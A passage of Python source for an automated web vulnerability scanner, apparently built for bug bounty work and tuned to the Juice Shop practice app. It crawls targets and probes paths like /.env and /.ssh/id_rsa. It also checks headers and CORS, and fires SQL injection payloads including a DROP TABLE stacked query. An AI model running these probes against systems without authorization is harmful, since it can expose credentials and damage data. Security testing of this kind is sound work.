            # ── SQL INJECTION (all 4 types) ────────────────
            scan_state["step"] = "SQL INJECTION"
            scan_state["progress"] = 75
            log("Testing SQL Injection (Error + Boolean + Time-Based + Union)...")
            _safe_module(test_sqli, target, urls, forms, params_map, headers, tech_stack)
            scan_state["progress"] = 86

            # ── LFI ───────────────────────────────────────
            scan_state["step"] = "LFI"
            scan_state["progress"] = 87
            log(f"Testing Local File Inclusion ({len(LFI_PAYLOADS)} payloads)...")
            _safe_module(test_lfi, target, urls, params_map, headers)
            scan_state["progress"] = 94

            # ── SSRF ──────────────────────────────────────
            scan_state["step"] = "SSRF"
            scan_state["progress"] = 88
            log("Testing Server-Side Request Forgery (SSRF)...")
            _safe_module(test_ssrf, target, urls, forms, params_map, headers)
            scan_state["progress"] = 91

            # ── ROUND 3: JWT TESTING ──────────────────────
            scan_state["step"] = "JWT"
            scan_state["progress"] = 91
            log("Testing JWT vulnerabilities (none alg, alg confusion, weak secret)...")
            _safe_module(test_jwt, target, urls, headers,
                         scan_state.get("auth_token_raw", ""))
            scan_state["progress"] = 93

            # ── ROUND 3: GRAPHQL ──────────────────────────
            scan_state["step"] = "GRAPHQL"
            scan_state["progress"] = 93
            log("Testing GraphQL (introspection + injection + batch)...")
            _safe_module(test_graphql, target, urls, headers)
            scan_state["progress"] = 95

            # ── ROUND 3: XXE INJECTION ────────────────────
            scan_state["step"] = "XXE"
            scan_state["progress"] = 95
            log("Testing XXE Injection (classic + blind + SSRF)...")
            _safe_module(test_xxe, target, urls, forms, headers)
            scan_state["progress"] = 96

            # ── ROUND 3: CORS ─────────────────────────────
            scan_state["step"] = "CORS"
            scan_state["progress"] = 97
            log("Testing CORS misconfiguration (reflection + null + subdomain)...")
            _safe_module(test_cors, target, urls, headers)
            scan_state["progress"] = 98

            # ── ROUND 3: SUBDOMAIN TAKEOVER (last — external DNS) ──
            scan_state["step"] = "SUBDOMAIN TAKEOVER"
            scan_state["progress"] = 99
            log("Testing subdomain takeover (CNAME dangling + fingerprints)...")
            _safe_module(test_subdomain_takeover, target, headers)
            scan_state["progress"] = 100

        scan_state["step"] = "COMPLETE"
        scan_state["progress"] = 100
        log(f"Scan complete. {len(scan_state['findings'])} vulnerabilities found.", "success")

    except WAFHardStopException as e:
        scan_state["error"] = str(e)
        log(f"SCAN STOPPED — WAF triggered: {e}", "danger")
        log("Tip: Lower rate limit to 3-5 req/sec and retry.", "warn")
    except Exception as e:
        scan_state["error"] = str(e)
        log(f"Scan error: {e}", "danger")
    finally:
        scan_state["running"] = False
        scan_state["done"]    = True


# ═══════════════════════════════════════════════════════════════
# MODULE 1: CRAWLER + JS ENDPOINT EXTRACTION + TECH FINGERPRINT
# ═══════════════════════════════════════════════════════════════
# Tech stack fingerprints
TECH_FINGERPRINTS = {
    "WordPress":   ["wp-content", "wp-includes", "wp-login.php", "xmlrpc.php"],
    "Drupal":      ["sites/default", "drupal.js", "Drupal.settings"],
    "Joomla":      ["/components/com_", "Joomla!", "joomla"],
    "Laravel":     ["laravel_session", "_token", "laravel"],
    "Django":      ["csrfmiddlewaretoken", "django", "__admin"],
    "Rails":       ["authenticity_token", "rails", "_rails_"],
    "ASP.NET":     ["__VIEWSTATE", "ASP.NET_SessionId", "asp.net"],
    "PHP":         [".php", "PHPSESSID", "php"],
    "Node.js":     ["express", "node.js", "connect.sid"],
    "Spring":      ["JSESSIONID", "spring", ".do"],
    "Angular":     ["ng-version", "angular", "ng-app"],
    "React":       ["react", "__reactFiber", "react-root"],
    "jQuery":      ["jquery", "jQuery"],
}

# JS endpoint patterns — find hidden API endpoints in JS files
JS_ENDPOINT_PATTERNS = [
    r'["\'](/api/[^\s"\'<>]+)["\']',
    r'["\'](/v\d+/[^\s"\'<>]+)["\']',
    r'url\s*[=:]\s*["\']([/][^\s"\'<>]+)["\']',
    r'fetch\s*\(["\']([^\s"\'<>]+)["\']',
    r'axios\.(get|post|put|delete)\s*\(["\']([^\s"\'<>]+)["\']',
    r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^\s"\'<>]+)["\']',
    r'endpoint\s*[=:]\s*["\']([^\s"\'<>]+)["\']',
    r'baseURL\s*[=:]\s*["\']([^\s"\'<>]+)["\']',
    r'apiUrl\s*[=:]\s*["\']([^\s"\'<>]+)["\']',
    r'href\s*=\s*["\']([/][^\s"\'<>?#]+\?[^\s"\'<>]+)["\']',
]

def fingerprint_tech(resp_text, resp_headers):
    """Detect tech stack from response"""
    detected = set()
    content = resp_text.lower()
    headers_str = str(resp_headers).lower()
    combined = content + headers_str
    for tech, signatures in TECH_FINGERPRINTS.items():
        if any(sig.lower() in combined for sig in signatures):
            detected.add(tech)
    return detected

def extract_js_endpoints(js_text, base_url):
    """Extract hidden API endpoints from JS source"""
    endpoints = set()
    base = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    for pattern in JS_ENDPOINT_PATTERNS:
        for match in re.finditer(pattern, js_text):
            path = match.group(1) if match.lastindex >= 1 else ""
            if path and not path.startswith("http"):
                full = base + path if path.startswith("/") else base + "/" + path
                endpoints.add(full)
            elif path and path.startswith("http"):
                if urlparse(base_url).netloc in path:
                    endpoints.add(path)
    return endpoints

def crawl(target, headers, max_pages=100):
    visited      = set()
    to_visit     = [target]
    found_urls   = []
    found_forms  = []
    params_map   = {}
    js_endpoints = set()
    base_domain  = urlparse(target).netloc
    tech_stack   = set()

    def _is_valid_url(url):
        """Reject malformed, quoted, or external URLs from JS extraction"""
        try:
            p = urlparse(url)
            # Must have same netloc as target
            if p.netloc and p.netloc != base_domain:
                return False
            # Reject URLs containing quotes, backslashes, or obvious JS artifacts
            if any(c in url for c in ['"', "'", '\\', '{', '}', '<', '>']):
                return False
            # Reject external protocol references
            if p.scheme and p.scheme not in ('http', 'https', ''):
                return False
            # Path must look like a real path
            path = p.path
            if not path or len(path) > 200:
                return False
            return True
        except Exception:
            return False

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        if url in visited:
            continue
        visited.add(url)

        try:
            # Allow redirects but handle HTTPS redirect gracefully on HTTP targets.
            # Upgrade-Insecure-Requests or HSTS can cause 301->HTTPS on localhost/staging,
            # which then fails SSL and returns empty response killing the crawl.
            try:
                resp = safe_get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
            except Exception:
                resp = safe_get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
            # If we landed on empty/error from HTTPS redirect, retry with explicit HTTPS
            if len(resp.text) < 100 and url.startswith('http://'):
                try:
                    https_url = url.replace('http://', 'https://', 1)
                    r2 = safe_get(https_url, headers=headers, timeout=10, verify=False, allow_redirects=True)
                    if len(r2.text) > len(resp.text):
                        resp = r2
                except Exception:
                    pass
            found_urls.append(url)
            log(f"Crawled: {url}", "muted")

            # Tech fingerprinting on first response
            if len(visited) <= 3:
                detected = fingerprint_tech(resp.text, resp.headers)
                tech_stack.update(detected)

            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                if params:
                    params_map[url] = list(params.keys())

            # Check if JS file — extract endpoints
            if url.endswith(".js") or "javascript" in resp.headers.get("content-type", "").lower():
                new_eps = extract_js_endpoints(resp.text, target)
                for ep in new_eps:
                    if ep not in visited and ep not in to_visit and _is_valid_url(ep):
                        js_endpoints.add(ep)
                        to_visit.append(ep)
                if new_eps:
                    log(f"JS endpoints found in {url}: {len(new_eps)}", "info")
                continue

            soup = BeautifulSoup(resp.text, "html.parser")

            for tag in soup.find_all("a", href=True):
                href = urljoin(url, tag["href"])
                p    = urlparse(href)
                if (p.netloc == base_domain and href not in visited
                        and href not in to_visit and _is_valid_url(href)):
                    to_visit.append(href)

            for form in soup.find_all("form"):
                action = urljoin(url, form.get("action", url))
                method = form.get("method", "get").lower()
                inputs = []
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    if name:
                        inputs.append({
                            "name":  name,
                            "type":  inp.get("type", "text"),
                            "value": inp.get("value", "test")
                        })
                if inputs:
                    found_forms.append({
                        "action": action, "method": method,
                        "inputs": inputs, "page": url
                    })

            # Extract JS files
            for script in soup.find_all("script", src=True):
                src = urljoin(url, script["src"])
                if urlparse(src).netloc == base_domain and src not in visited:
                    to_visit.append(src)

            # Extract inline JS for endpoints
            for script in soup.find_all("script"):
                if script.string:
                    new_eps = extract_js_endpoints(script.string, target)
                    for ep in new_eps:
                        if ep not in visited and ep not in to_visit and _is_valid_url(ep):
                            js_endpoints.add(ep)
                            to_visit.append(ep)

        except Exception as e:
            log(f"Crawl error {url}: {e}", "muted")

    if js_endpoints:
        log(f"Total JS-discovered endpoints: {len(js_endpoints)}", "info")

    return found_urls, found_forms, params_map, tech_stack


# ═══════════════════════════════════════════════════════════════
# MODULE 2: SECURITY HEADERS
# ═══════════════════════════════════════════════════════════════
def check_headers(target, headers):
    try:
        resp = safe_get(target, headers=headers, timeout=10, verify=False)
        rh   = {k.lower(): v for k, v in resp.headers.items()}

        checks = {
            "content-security-policy": ("Missing Content-Security-Policy",
                "No CSP header. Browsers have zero protection against XSS injection.",
                "Add: Content-Security-Policy: default-src 'self'"),
            "x-frame-options": ("Missing X-Frame-Options",
                "Site can be embedded in iframes — enables clickjacking attacks.",
                "Add: X-Frame-Options: DENY"),
            "strict-transport-security": ("Missing Strict-Transport-Security (HSTS)",
                "Browsers may use HTTP even when HTTPS is available — enables downgrade attacks.",
                "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
            "x-content-type-options": ("Missing X-Content-Type-Options",
                "Browsers may MIME-sniff responses — uploaded files could be executed as scripts.",
                "Add: X-Content-Type-Options: nosniff"),
            "referrer-policy": ("Missing Referrer-Policy",
                "Sensitive URL data leaked to third parties via Referer header.",
                "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            "permissions-policy": ("Missing Permissions-Policy",
                "No restrictions on browser features (camera, microphone, geolocation).",
                "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()"),
        }

        for key, (name, desc, fix) in checks.items():
            if key not in rh:
                add_finding(name, "medium", target, desc,
                    f"HTTP response missing header: {key}", fix)

        server = rh.get("server", "")
        if server and any(c.isdigit() for c in server):
            add_finding("Server Version Disclosure", "low", target,
                f"Server header reveals version: {server}. Helps attackers find CVEs.",
                f"Server: {server}",
                "Set ServerTokens Prod (Apache) or server_tokens off (Nginx)")

        # CORS check
        origin_test = headers.copy()
        origin_test["Origin"] = "https://evil.com"
        try:
            cors_resp = safe_get(target, headers=origin_test, timeout=8, verify=False)
            acao = cors_resp.headers.get("Access-Control-Allow-Origin", "")
            acac = cors_resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*" or (acao == "https://evil.com" and acac.lower() == "true"):
                add_finding("CORS Misconfiguration", "high", target,
                    "Server reflects arbitrary Origin with credentials allowed.",
                    f"Origin: https://evil.com → ACAO: {acao}, Credentials: {acac}",
                    "Whitelist only trusted origins. Never use * with credentials.")
        except Exception:
            pass

    except Exception as e:
        log(f"Header check error: {e}", "warn")


# ═══════════════════════════════════════════════════════════════
# MODULE 3: SECRETS & SENSITIVE FILES (threaded)
# ═══════════════════════════════════════════════════════════════
def check_secrets(target, urls, headers):
    parsed = urlparse(target)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    sensitive_paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/.env.dev", "/.env.development", "/.env.staging",
        "/config.php", "/config.inc.php", "/configuration.php",
        "/wp-config.php", "/wp-config.php.bak",
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/backup.sql", "/dump.sql", "/database.sql", "/db.sql",
        "/.htaccess", "/.htpasswd",
        "/api/v1/", "/api/v2/", "/api/",
        "/swagger.json", "/swagger.yaml", "/openapi.json",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/.DS_Store", "/Thumbs.db",
        "/server-status", "/server-info",
        "/elmah.axd", "/trace.axd",
        "/web.config", "/Web.config",
        "/package.json", "/composer.json",
        "/.bash_history", "/.ssh/id_rsa",
        "/id_rsa", "/private.key", "/server.key",
        "/backup.zip", "/backup.tar.gz", "/site.zip",
        "/.svn/entries", "/.hg/",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/actuator", "/actuator/env", "/actuator/health",
        "/__debug__/", "/django-admin/",
    ]

    SKIP_PATHS     = {"/robots.txt", "/sitemap.xml", "/health", "/status"}
    WILDCARD_PATHS = {"/crossdomain.xml", "/clientaccesspolicy.xml"}

    secret_patterns = [
        (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{20,})', "API Key Exposed"),
        (r'(?i)(secret[_-]?key|secret)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{20,})', "Secret Key Exposed"),
        (r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']([^"\']{6,})["\']', "Hardcoded Password"),
        (r'(?i)(aws_access_key_id)\s*[=:]\s*["\']?([A-Z0-9]{20})', "AWS Access Key"),
        (r'(?i)(aws_secret_access_key)\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})', "AWS Secret Key"),
        (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
        (r'(?i)bearer\s+[A-Za-z0-9\-._~+/]+=*', "Bearer Token Exposed"),
        (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "JWT Token Exposed"),
        (r'(?i)mysql://[^\s"\']+', "Database Connection String"),
        (r'(?i)postgres://[^\s"\']+', "PostgreSQL Connection String"),
        (r'(?i)mongodb://[^\s"\']+', "MongoDB Connection String"),
    ]

    # Get the baseline homepage size to detect SPA catch-all responses
    # SPAs (Angular/React/Vue) return index.html for ALL unknown URLs — same size every time
    try:
        _baseline_resp = safe_get(base + "/this_path_does_not_exist_sentrix_probe_xyz123",
                                  headers=headers, timeout=6, verify=False)
        _baseline_size = len(_baseline_resp.text)
        _baseline_ct   = _baseline_resp.headers.get("content-type", "")
        _is_spa        = (_baseline_resp.status_code == 200 and
                          "html" in _baseline_ct and _baseline_size > 1000)
    except Exception:
        _baseline_size = -1
        _is_spa        = False

    # Content-type signatures that prove the file is real
    REAL_FILE_SIGNATURES = {
        ".env":        ["DB_PASSWORD", "APP_KEY", "SECRET", "API_KEY", "DATABASE_URL"],
        ".git":        ["ref:", "HEAD", "[core]", "repositoryformatversion"],
        "config.php":  ["<?php", "define(", "DB_HOST", "mysql"],
        "wp-config":   ["<?php", "DB_NAME", "table_prefix"],
        "backup.sql":  ["INSERT INTO", "CREATE TABLE", "DROP TABLE", "mysqldump"],
        "dump.sql":    ["INSERT INTO", "CREATE TABLE", "DROP TABLE"],
        "database.sql":["INSERT INTO", "CREATE TABLE"],
        "db.sql":      ["INSERT INTO", "CREATE TABLE"],
        "id_rsa":      ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
        "private.key": ["BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY"],
        "server.key":  ["BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY"],
        "swagger":     ['"swagger"', '"openapi"', '"paths"', "swagger:", "openapi:"],
        "openapi":     ['"openapi"', '"paths"', "openapi:"],
        "package.json":["\"dependencies\"", "\"scripts\"", "\"name\"", "\"version\""],
        "htaccess":    ["RewriteEngine", "Options", "Deny from", "Allow from"],
        "htpasswd":    [":$apr1$", ":$2y$", ":{SHA}"],
        "phpinfo":     ["PHP Version", "phpinfo()", "PHP Variables"],
    }

    def _get_file_signatures(path):
        """Return content signatures to verify this is a real file, not a catch-all"""
        for key, sigs in REAL_FILE_SIGNATURES.items():
            if key in path.lower():
                return sigs
        return None

    def _check_path(path):
        try:
            if path in SKIP_PATHS:
                return
            resp = safe_get(base + path, headers=headers, timeout=6, verify=False)
            if resp.status_code != 200 or len(resp.text) < 10:
                return

            # ── SPA catch-all detection ─────────────────────────────────
            # If baseline probe returned same size ±5%, this is a catch-all — skip
            if _is_spa and _baseline_size > 0:
                size_ratio = len(resp.text) / _baseline_size
                if 0.95 <= size_ratio <= 1.05:
                    return  # Same size as 404 catch-all — false positive

            # ── Content-type sanity check ────────────────────────────────
            ct = resp.headers.get("content-type", "").lower()
            # HTML response for a .env/.sql/.key file = catch-all, not a real file
            if "text/html" in ct and not any(ext in path for ext in
                [".html", ".htm", ".php", ".asp", ".aspx", "/"]):
                # Check if it has real file content despite HTML content-type
                required_sigs = _get_file_signatures(path)
                if required_sigs and not any(sig.lower() in resp.text.lower()
                                              for sig in required_sigs):
                    return  # HTML response without file-specific content — false positive

            # ── Content verification for high-value paths ────────────────
            required_sigs = _get_file_signatures(path)
            if required_sigs:
                if not any(sig.lower() in resp.text.lower() for sig in required_sigs):
                    return  # File doesn't contain expected content — not real

            if path in WILDCARD_PATHS:
                if not any(w in resp.text for w in ['*', 'allow-access-from domain="*"']):
                    return
                add_finding(f"Insecure Cross-Domain Policy: {path}", "medium", base + path,
                    f"{path} allows wildcard cross-domain access.",
                    f"GET {base + path} -> HTTP 200, wildcard policy detected",
                    "Restrict cross-domain policy to specific trusted domains only.")
                return

            severity = "critical" if any(x in path for x in [
                ".env", "config.php", "wp-config", ".git",
                "backup.sql", "id_rsa", "private.key", "dump.sql"
            ]) else "medium"
            add_finding(f"Sensitive File Exposed: {path}", severity, path,
                f"File '{path}' publicly accessible — verified real content, not catch-all.",
                f"GET {base + path} -> HTTP 200, {len(resp.text)} bytes, content verified",
                "Block access in server config. Add deny rule in .htaccess or nginx.")
        except Exception:
            pass

    # Threaded path checks
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        ex.map(_check_path, sensitive_paths)

    # Common placeholder words that are NOT real secrets
    _SECRET_PLACEHOLDERS = {
        'password', 'passwd', 'pwd', 'secret', 'changeme', 'yourpassword',
        'enter_password', 'your_password', 'your_secret', 'placeholder',
        'example', 'test', 'demo', 'sample', 'undefined', 'null', 'none',
        'xxxxxxxx', '12345678', 'pass1234', 'default', 'foobar', 'abcdefgh',
        'mysecret', 'mypassword', 'admin', 'root', 'user', 'password123',
    }

    def _is_real_secret(value):
        """Return True if the matched value looks like a real secret, not a placeholder."""
        v = value.strip().lower()
        # Reject common placeholders
        if v in _SECRET_PLACEHOLDERS:
            return False
        # Reject values that are just repeats of the key name
        if v in ('password', 'passwd', 'pwd', 'secret', 'apikey', 'api_key'):
            return False
        # Require at least 8 chars for passwords
        if len(v) < 8:
            return False
        # Require some alphanumeric content (not just symbols)
        if not re.search(r'[a-zA-Z0-9]', v):
            return False
        # Reject obvious template/variable patterns like ${VAR} or {{var}}
        if re.search(r'[${]{1,2}[a-zA-Z_]', v):
            return False
        return True

    # Scan page sources for hardcoded secrets
    for url in urls[:20]:
        try:
            resp = safe_get(url, headers=headers, timeout=8, verify=False)
            for pattern, name in secret_patterns:
                matches = re.findall(pattern, resp.text)
                for match in matches:
                    # match is a tuple (key_group, value_group) or just a string
                    value = match[-1] if isinstance(match, tuple) else match
                    if not _is_real_secret(value):
                        continue
                    add_finding(f"{name} in Source Code", "critical", url,
                        f"Hardcoded {name} found in page source.",
                        f"Pattern match: {str(match)[:100]}",
                        "Remove secrets from source code. Use environment variables.")
                    break  # one finding per pattern per URL is enough
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# MODULE 4: SQL INJECTION — Error + Boolean-Blind + Time-Based + Union
# ═══════════════════════════════════════════════════════════════
def test_sqli(target, urls, forms, params_map, headers, tech_stack=None):
    found = set()
    tech_stack = tech_stack or set()

    # ── Phase 0: REST endpoint GET param injection ─────────────
    # For bug bounty: probe discovered REST/API URLs directly with
    # SQLi payloads appended as query params. Targets search, filter,
    # lookup endpoints that real apps expose. Catches SQLite/MySQL
    # injection in endpoints like /rest/products/search?q='
    parsed_target = urlparse(target)
    base_origin   = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # SQLi payloads tuned for SQLite (Juice Shop) + MySQL + MSSQL
    SQLI_SEARCH_PAYLOADS = [
        ("'",                          "sqlite/generic quoting error"),
        ("''",                         "double-quote escape test"),
        ("' OR '1'='1",               "classic OR bypass"),
        ("' OR '1'='1'--",            "comment bypass"),
        ("' OR 1=1--",                "numeric OR bypass"),
        ("1 AND 1=1--",               "boolean true"),
        ("1 AND 1=2--",               "boolean false"),
        ("' AND SLEEP(3)--",          "MySQL time-based"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "MySQL nested sleep"),
        ("'; SELECT pg_sleep(3)--",   "PostgreSQL sleep"),
        ("' WAITFOR DELAY '0:0:3'--", "MSSQL delay"),
        ("' UNION SELECT NULL--",      "union 1 col"),
        ("' UNION SELECT NULL,NULL--", "union 2 col"),
        ("' UNION SELECT NULL,NULL,NULL--", "union 3 col"),
        ("\\",                       "backslash escape"),
        ("%27",                        "URL-encoded quote"),
        ("1;DROP TABLE--",             "stacked query attempt"),
    ]

    SEARCH_PARAMS = ["q", "search", "query", "keyword", "filter",
                     "term", "name", "email", "username", "s",
                     "text", "title", "description", "input"]

    REST_INJECT_KEYWORDS = ["/api/", "/rest/", "/v1/", "/v2/", "/v3/",
                             "search", "find", "query", "products",
                             "users", "items", "orders"]

    # Cache of baseline responses for (base_url, param) pairs.
    # Used by _rest_sqli to perform differential analysis on hardcoded paths.
    _rest_baseline_cache = {}
    _rest_baseline_lock = __import__("threading").Lock()

    def _rest_sqli(args):
        url, param, payload, desc, hdrs = args
        p = urlparse(url)
        test_url = f"{base_origin}{p.path}?{param}={payload}"
        baseline_url = f"{base_origin}{p.path}?{param}=test"
        cache_key = (base_origin + p.path, param)

        try:
            # Lazily fetch and cache baseline for this (path, param) pair
            with _rest_baseline_lock:
                if cache_key not in _rest_baseline_cache:
                    _rest_baseline_cache[cache_key] = None  # sentinel to avoid re-entry

            if _rest_baseline_cache.get(cache_key) is None:
                try:
                    br = safe_get(baseline_url, headers=hdrs, timeout=8, verify=False)
                    with _rest_baseline_lock:
                        _rest_baseline_cache[cache_key] = br.text.lower()
                except Exception:
                    with _rest_baseline_lock:
                        _rest_baseline_cache[cache_key] = ""

            baseline_body = _rest_baseline_cache.get(cache_key, "")

            resp = safe_get(test_url, headers=hdrs, timeout=10, verify=False)
            body = resp.text.lower()

            # Check for SQL errors — only report if NOT present in baseline
            for err in SQL_ERRORS:
                if err in body and err not in baseline_body:
                    return (test_url, param, payload, err, p.path, "error-based-rest")

            # Check for anomalous 500 with unambiguous SQL error markers — differential only.
            # Use only strings that would never appear in a clean API response
            # (avoids false negatives from common words like "query" or "database"
            # that Juice Shop echoes back in its generic error messages).
            if resp.status_code == 500:
                sql_500_markers = [
                    "syntax error", "sql syntax", "unrecognized token",
                    "sqlite_error", "sequelizedatabaseerror",
                    "near \"'\"", "near \"\\\"\"",
                    "unterminated string", "unclosed quotation",
                    "you have an error in your sql",
                    "warning: mysql", "pg::syntaxerror",
                    "ora-00907", "ora-00933", "ora-00942",
                    "select * from", "where ((", "like '%", "deleteat is null",
                ]
                for h in sql_500_markers:
                    if h in body and h not in baseline_body:
                        return (test_url, param, payload,
                                f"HTTP 500 + SQL hint in body", p.path, "error-rest-500")
        except Exception:
            pass
        return None

    # High-value search/filter paths commonly missed by crawlers.
    # These are probed directly regardless of whether the crawler found them.
    KNOWN_SEARCH_PATHS = [
        "/rest/products/search",
        "/rest/user/search",
        "/api/search",
        "/api/products/search",
        "/search",
        "/api/v1/search",
        "/api/v2/search",
        "/rest/search",
        "/api/items/search",
        "/api/orders/search",
    ]

    # Build REST injection targets from discovered URLs + known search paths
    rest_targets = []
    seen_paths = set()

    # First: add hardcoded high-value search paths — but only if they exist.
    # A clean GET with no payload must return 200/401/403/405/422/500 (not 404/400)
    # to confirm the endpoint is live. This prevents FPs on non-existent paths
    # that return generic 500 errors containing words like "sql" or "syntax".
    def _endpoint_exists(path):
        """Return True only if the endpoint is a real API endpoint (returns JSON, not HTML)."""
        try:
            r = safe_get(base_origin + path, headers=headers, timeout=6, verify=False)
            if r.status_code in (404, 410):
                return False
            # Angular SPAs return 200 + HTML for all unknown routes.
            # A real API endpoint returns JSON (or at least not HTML).
            ct = r.headers.get("Content-Type", "").lower()
            if "html" in ct:
                return False
            # Also reject if body starts with <!DOCTYPE or <html
            body_start = r.text[:100].lstrip().lower()
            if body_start.startswith("<!") or body_start.startswith("<html"):
                return False
            return True
        except Exception:
            return False

    for path in KNOWN_SEARCH_PATHS:
        if path not in seen_paths:
            if not _endpoint_exists(path):
                continue  # skip — endpoint doesn't exist on this target
            seen_paths.add(path)
            full_url = base_origin + path
            for param in SEARCH_PARAMS:
                for payload, desc in SQLI_SEARCH_PAYLOADS[:8]:
                    rest_targets.append((full_url, param, payload, desc, headers))

    # Then: add crawler-discovered URLs
    for url in urls:
        p = urlparse(url)
        if p.path in seen_paths:
            continue
        if any(kw in p.path.lower() for kw in REST_INJECT_KEYWORDS):
            seen_paths.add(p.path)
            for param in SEARCH_PARAMS:
                for payload, desc in SQLI_SEARCH_PAYLOADS[:8]:
                    rest_targets.append((url, param, payload, desc, headers))

    if rest_targets:
        log(f"SQLi Phase 0 (REST endpoint injection): {len(rest_targets)} combinations...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            futures = {ex.submit(_rest_sqli, t): t for t in rest_targets}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    url, param, payload, err, path, method = r
                    key = f"{path}:{param}"
                    if key not in found:
                        found.add(key)
                        found.add(url)
                        curl = (f'curl -s -H "Authorization: Bearer {headers.get("Authorization","").replace("Bearer ","")}" '
                                f'"{ base_origin}{path}?{param}={payload}"')
                        add_finding("SQL Injection", "critical",
                            f"{path}?{param}=",
                            f"SQL Injection in REST endpoint '{path}' via param '{param}'. "
                            f"Evidence: {err}. Full database access possible.",
                            f"GET {path}?{param}={payload} -> {err}",
                            "Use parameterized queries / ORM. Never concatenate user input into SQL. "
                            "Validate and sanitize all query parameters.",
                            curl=curl)

    # ── Phase 0b: POST body JSON injection ──────────────────────
    # Many REST APIs accept search/filter params in the POST body as JSON,
    # not as URL query params. This phase tests those endpoints directly.
    # Juice Shop: POST /rest/products/search with {"q": "payload"} in body
    # is the canonical example of a missed SQLi vector.
    POST_SEARCH_PATHS = [
        "/rest/products/search",
        "/api/search",
        "/rest/user/search",
        "/api/products/search",
        "/search",
        "/api/v1/search",
        "/api/v2/search",
    ]
    # Also add any crawler-discovered URLs that look like search endpoints
    for url in urls:
        p = urlparse(url)
        if "search" in p.path.lower() or "find" in p.path.lower():
            if p.path not in [urlparse(base_origin + pp).path for pp in POST_SEARCH_PATHS]:
                POST_SEARCH_PATHS.append(p.path)

    def _post_json_sqli(args):
        path, param, payload, desc = args
        url = base_origin + path
        post_headers = headers.copy()
        post_headers["Content-Type"] = "application/json"
        body_variants = [
            json.dumps({param: payload}),                        # {"q": "payload"}
            json.dumps({"search": {param: payload}}),            # {"search": {"q": "payload"}}
            json.dumps({"filter": {param: payload}}),            # {"filter": {"q": "payload"}}
            json.dumps({"data": {param: payload}}),              # {"data": {"q": "payload"}}
        ]
        for body in body_variants:
            try:
                resp = safe_post(url, headers=post_headers,
                                 data=body, timeout=10, verify=False)
                if resp.status_code == 404:
                    break  # endpoint doesn't exist, skip all variants
                text = resp.text.lower()
                for err in SQL_ERRORS:
                    if err in text:
                        return (path, param, payload, err, body, resp.status_code)
                if resp.status_code == 500:
                    sql_hints = ["syntax", "sql", "query", "sqlite", "mysql",
                                 "database", "column", "table", "select", "sequelize"]
                    if any(h in text for h in sql_hints):
                        return (path, param, payload,
                                f"HTTP 500 + SQL hint ({next(h for h in sql_hints if h in text)})",
                                body, resp.status_code)
            except Exception:
                continue
        return None

    post_json_targets = []
    seen_post_paths = set()
    for path in POST_SEARCH_PATHS:
        if path in seen_post_paths:
            continue
        if not _endpoint_exists(path):
            continue  # skip non-existent paths
        seen_post_paths.add(path)
        for param in SEARCH_PARAMS[:6]:  # q, search, query, keyword, filter, term
            for payload, desc in SQLI_SEARCH_PAYLOADS[:8]:
                post_json_targets.append((path, param, payload, desc))

    if post_json_targets:
        log(f"SQLi Phase 0b (POST/JSON body injection): {len(post_json_targets)} combinations...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            futures = {ex.submit(_post_json_sqli, t): t for t in post_json_targets}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    path, param, payload, err, body, status = r
                    key = f"post-json:{path}:{param}"
                    if key not in found:
                        found.add(key)
                        curl = (f'curl -s -X POST '
                                f'-H "Authorization: Bearer {headers.get("Authorization","").replace("Bearer ","")}" '
                                f'-H "Content-Type: application/json" '
                                f'-d \'{body}\' '
                                f'"{base_origin}{path}"')
                        add_finding("SQL Injection (POST Body)", "critical",
                            path,
                            f"SQL Injection in POST body of '{path}' via JSON param '{param}'. "
                            f"Evidence: {err}. Attacker can extract full database contents.",
                            f"POST {path} body={body} -> {err}",
                            "Use parameterized queries / ORM. Never interpolate user-supplied "
                            "JSON fields into SQL. Validate all input server-side.",
                            curl=curl)

    # ── Phase 1: Error-based (fast) ───────────────────────────
    def _error_sqli(args):
        url, param, payload, hdrs = args
        p = urlparse(url)
        ps = parse_qs(p.query)
        tp = {k: v[0] for k, v in ps.items()}
        tp[param] = payload
        test_url = urlunparse(p._replace(query=urlencode(tp)))
        try:
            resp = safe_get(test_url, headers=hdrs, timeout=8, verify=False)
            body = resp.text.lower()
            for err in SQL_ERRORS:
                if err in body:
                    return (url, param, payload, err, p.path, "error-based")
        except Exception:
            pass
        return None

    # ── Smart filter: only test the highest-value params for Phase 1 ──
    # With SMART INJECT adding 500+ endpoints, we must limit Phase 1 to
    # the most likely SQLi params. Others get caught by Phase 0 REST probe.
    SQLI_HIGH_VALUE_PARAMS = {
